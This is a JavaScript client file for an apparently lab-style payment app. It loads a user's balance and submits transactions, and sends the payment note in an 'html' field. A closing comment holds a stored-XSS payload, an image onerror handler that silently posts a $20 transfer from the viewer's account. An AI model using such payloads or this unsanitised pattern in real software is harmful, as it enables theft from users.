function initialize()
{
    // Get username and balance
    fetch('/get-user', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    }).then(response => {
        if (response.status == 200)
        {
            response.json().then(json => {
                document.getElementById("uname").innerText = json.username;
                document.getElementById("balance").innerText = `$${json.balance}`;
            });
        }
        else
        {
            window.location.href = '/app.html';
        }
    });
}

// Submits a transaction!
function pay()
{
    const recipient = document.getElementById("recipient").value;
    const amount = document.getElementById("amount").value;
    const note = document.getElementById("payment-note").value;

    fetch('/new-transaction', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            html: note,
            amount: amount,
            recipient: recipient
        })
    }).then(response => {
        if (response.status == 200)
        {
            document.getElementById("recipient").value = "";
            document.getElementById("amount").value = 0;
            document.getElementById("payment-note").value = "";
            location.reload();
        }
        else
        {
            response.json().then(err => {
                alert(err.error);
            });
        }
    });  
}

/*
    <image src=1 onerror="fetch('/new-transaction', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            html: 'XSS',
            amount: 20,
            recipient: 'Venmo'
        })
    })" />
*/